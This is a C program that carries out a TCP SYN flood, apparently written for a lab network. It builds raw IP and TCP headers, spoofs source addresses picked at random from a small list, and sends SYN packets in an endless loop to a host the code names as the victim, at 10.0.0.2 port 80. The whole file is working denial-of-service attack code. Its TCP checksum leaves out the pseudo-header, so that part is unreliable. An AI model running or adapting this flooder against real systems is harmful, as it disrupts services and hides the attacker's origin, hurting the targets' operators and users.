#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <unistd.h>

#define PACKET_SIZE 4096

unsigned short csum(unsigned short *ptr,int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }

    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;

    return(answer);
}

int main() {
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(s < 0) {
        perror("Error creating RAW socket");
        exit(1);
    }

    char packet[PACKET_SIZE];

    struct iphdr *ip = (struct iphdr*) packet;
    struct tcphdr *tcp = (struct tcphdr*) (packet + sizeof(struct iphdr));

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;

    // Victim IP (h2)
    dest.sin_addr.s_addr = inet_addr("10.0.0.2");

    // Enable IP_HDRINCL
    int one = 1;
    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("Error setting IP_HDRINCL");
        exit(1);
    }

    char *spoof_ips[] = {
        "10.0.0.3",
        "10.0.0.4",
        "10.0.0.5",
        "10.0.0.6"
    };

    printf("Starting SYN Flood...\n");

    while(1) {
        memset(packet, 0, PACKET_SIZE);

        // IP Header
        ip->ihl = 5;
        ip->version = 4;
        ip->tos = 0;
        ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        ip->id = htonl(rand() % 65535);
        ip->ttl = 255;
        ip->protocol = IPPROTO_TCP;
        ip->saddr = inet_addr(spoof_ips[rand()%4]);  // spoofed sources
        ip->daddr = dest.sin_addr.s_addr;

        ip->check = csum((unsigned short*)packet, ip->tot_len);

        // TCP Header
        tcp->source = htons(rand() % 65535);
        tcp->dest = htons(80);     // SYN to victim port 80
        tcp->seq = random();
        tcp->doff = 5;
        tcp->syn = 1;
        tcp->window = htons(5840); 

        tcp->check = 0;

        // TCP checksum
        tcp->check = csum((unsigned short*)tcp, sizeof(struct tcphdr));

        // Send
        if(sendto(s, packet, ip->tot_len, 0,
           (struct sockaddr *)&dest, sizeof(dest)) < 0)
            perror("sendto failed");
    }

    close(s);
    return 0;
}
